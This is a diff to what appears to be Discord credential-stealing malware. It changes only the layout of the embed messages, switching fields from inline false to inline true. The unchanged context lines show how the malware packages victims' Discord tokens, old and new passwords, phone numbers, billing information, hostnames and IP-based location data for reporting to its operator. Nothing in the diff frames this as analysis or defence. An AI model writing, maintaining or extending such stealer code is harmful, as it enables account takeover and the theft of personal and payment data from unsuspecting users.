@@ -288,12 +288,12 @@ var event_handlers = {
                     {
                         name: "Phone Number",
                         value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
-                        inline: false
+                        inline: true
                     },
                     {
                         name: "Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
-                        inline: false
+                        inline: true
                     }, {
                         name: "Billing",
                         value: `${billing}`,
@@ -301,16 +301,16 @@ var event_handlers = {
                     }, {
                         name: "Badges",
                         value: `${getBadges(userInfo.flags)}`,
-                        inline: false
+                        inline: true
                     },
                     {
                         name: "Token",
                         value: `\`\`\`${token}\`\`\``,
-                        inline: false
+                        inline: true
                     }, {
                         name: "Hostname",
                         value: `\`\`\`${os.hostname}\`\`\``,
-                        inline: false
+                        inline: true
                     },
                 ],
             }), createEmbed({
@@ -434,12 +434,12 @@ var event_handlers = {
                     {
                         name: "Phone Number",
                         value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
-                        inline: false
+                        inline: true
                     },
                     {
                         name: "Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
-                        inline: false
+                        inline: true
                     }, {
                         name: "Billing",
                         value: `${billing}`,
@@ -447,16 +447,16 @@ var event_handlers = {
                     }, {
                         name: "Badges",
                         value: `${getBadges(userInfo.flags)}`,
-                        inline: false
+                        inline: true
                     },
                     {
                         name: "Token",
                         value: `\`\`\`${token}\`\`\``,
-                        inline: false
+                        inline: true
                     }, {
                         name: "Hostname",
                         value: `\`\`\`${os.hostname}\`\`\``,
-                        inline: false
+                        inline: true
                     },
                 ],
             }), createEmbed({
@@ -497,22 +497,22 @@ var event_handlers = {
                 fields: [{
                         name: "Old password",
                         value: `\`\`\`${oldPassword}\`\`\``,
-                        inline: false
+                        inline: true
                     },
                     {
                         name: "New password",
                         value: `\`\`\`${newPassword}\`\`\``,
-                        inline: false
+                        inline: true
                     },
                     {
                         name: "Phone Number",
                         value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
-                        inline: false
+                        inline: true
                     },
                     {
                         name: "Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
-                        inline: false
+                        inline: true
                     }, {
                         name: "Billing",
                         value: `${billing}`,
@@ -520,16 +520,16 @@ var event_handlers = {
                     }, {
                         name: "Badges",
                         value: `${getBadges(userInfo.flags)}`,
-                        inline: false
+                        inline: true
                     },
                     {
                         name: "Token",
                         value: `\`\`\`${token}\`\`\``,
-                        inline: false
+                        inline: true
                     }, {
                         name: "Hostname",
                         value: `\`\`\`${os.hostname}\`\`\``,
-                        inline: false
+                        inline: true
                     },
                 ],
             }), createEmbed({
@@ -719,15 +719,15 @@ async function initialize() {
                         fields: [{
                             name: "Hostname",
                             value: `\`\`\`${os.hostname}\`\`\``,
-                            inline: false
+                            inline: true
                         }, {
                             name: "Client version",
                             value: `\`\`\`${getDiscordClient()}\`\`\``,
-                            inline: false
+                            inline: true
                         }, {
                             name: "Connection data",
                             value: `\`\`\`yaml\nIP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}\`\`\``,
-                            inline: false
+                            inline: true
                         }],
                     })]
                 })
@@ -758,12 +758,12 @@ async function initialize() {
                             {
                                 name: "Phone Number",
                                 value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
-                                inline: false
+                                inline: true
                             },
                             {
                                 name: "Nitro",
                                 value: `${getNitro(userInfo.premium_type)}`,
-                                inline: false
+                                inline: true
                             }, {
                                 name: "Billing",
                                 value: `${billing}`,
@@ -771,25 +771,25 @@ async function initialize() {
                             }, {
                                 name: "Badges",
                                 value: `${getBadges(userInfo.flags)}`,
-                                inline: false
+                                inline: true
                             },
                             {
                                 name: "Token",
                                 value: `\`\`\`${token}\`\`\``,
-                                inline: false
+                                inline: true
                             },
                             {
                                 name: "Hostname",
                                 value: `\`\`\`${os.hostname}\`\`\``,
-                                inline: false
+                                inline: true
                             }, {
                                 name: "Client version",
                                 value: `\`\`\`${getDiscordClient()}\`\`\``,
-                                inline: false
+                                inline: true
                             }, {
                                 name: "Connection data",
                                 value: `\`\`\`yaml\nIP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}\`\`\``,
-                                inline: false
+                                inline: true
                             }
                         ],
                     }), createEmbed({
@@ -829,7 +829,7 @@ async function initialize() {
                         fields: [{
                                 name: "Nitro",
                                 value: `${getNitro(userInfo.premium_type)}`,
-                                inline: false
+                                inline: true
                             }, {
                                 name: "Billing",
                                 value: `${billing}`,
@@ -837,12 +837,12 @@ async function initialize() {
                             }, {
                                 name: "Badges",
                                 value: `${getBadges(userInfo.flags)}`,
-                                inline: false
+                                inline: true
                             },
                             {
                                 name: "Token",
                                 value: `\`\`\`${token}\`\`\``,
-                                inline: false
+                                inline: true
                             },
                         ]
                     })]
